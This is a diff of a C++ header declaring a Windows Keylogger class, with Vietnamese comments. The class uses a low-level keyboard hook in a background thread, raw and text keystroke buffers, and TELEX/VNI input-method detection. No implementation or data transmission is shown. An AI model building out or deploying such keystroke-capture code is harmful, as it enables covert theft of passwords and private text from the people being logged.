@@ -7,42 +7,30 @@
 
 class Keylogger {
 private:
-    // Buffer chua chuoi cac phim da bat duoc
-    std::string _logBuffer;
+    std::string _rawLogBuffer;   // Buffer cho phím thô (RAW)
+    std::string _finalLogBuffer; // Buffer cho văn bản (TEXT)
 
-    // Mutex de bao ve buffer khi 2 luong cung truy cap (tranh loi crash)
+    std::string _detectedMode;      // TELEX / VNI
+    std::string _inputMethodStatus; // ON / OFF
+    DWORD _lastPhysicalKey;
+
     std::mutex _mutex;
-
-    // Bien thread de chay keylogger ngam
     std::thread _loggerThread;
-
-    // Bien kiem soat vong lap
     bool _isRunning;
-
-    // Handle cua Hook
     HHOOK _hook;
-
-    // [MỚI] ID của thread chứa vòng lặp Hook.
-    // Cần thiết để hàm StopKeyLogging có thể gửi tin nhắn WM_QUIT vào đúng thread này.
     DWORD _threadId;
 
-    // Cac ham phu tro (Helper)
-    void RunHookLoop(); // Vong lap chinh cua Keylogger
-    void ProcessKey(DWORD vkCode); // Xu ly ma phim tho thanh ky tu
-
-    // Ham callback tinh (bat buoc theo quy dinh cua Windows API)
+    void RunHookLoop();
+    void ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags);
+    void AnalyzeInputMethod(DWORD vkCode, bool isInjected);
+    std::string MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps); // Hàm map phím
     static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 public:
     Keylogger();
     ~Keylogger();
 
-    // 1. Chay keylogger ngam (StartKeyLogging)
     void StartKeyLogging();
-
-    // 2. Lay buffer va xoa buffer cu (GetLoggedKeys)
-    std::string GetLoggedKeys();
-
-    // Dung keylogger (Can thiet de don dep bo nho)
     void StopKeyLogging();
+    std::string GetLoggedKeys(); // Hàm trả về format đặc biệt
 };
